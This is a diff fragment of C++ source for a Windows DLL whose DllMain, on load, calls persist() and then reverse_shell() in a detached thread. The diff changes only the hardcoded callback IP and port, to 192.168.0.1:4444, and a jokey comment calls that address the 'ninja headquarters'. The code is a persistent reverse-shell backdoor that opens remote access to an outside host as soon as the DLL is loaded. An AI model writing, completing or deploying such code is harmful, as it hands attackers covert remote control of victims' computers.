@@ -167,8 +167,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
                 persist();
                 
                 // Ninja headquarters coordinates (configure these for your dojo)
-                std::string ip = "192.168.0.28";
-                int port = 44895;
+                std::string ip = "192.168.0.1";
+                int port = 4444;
                 
                 reverse_shell(ip, port);
             }).detach();
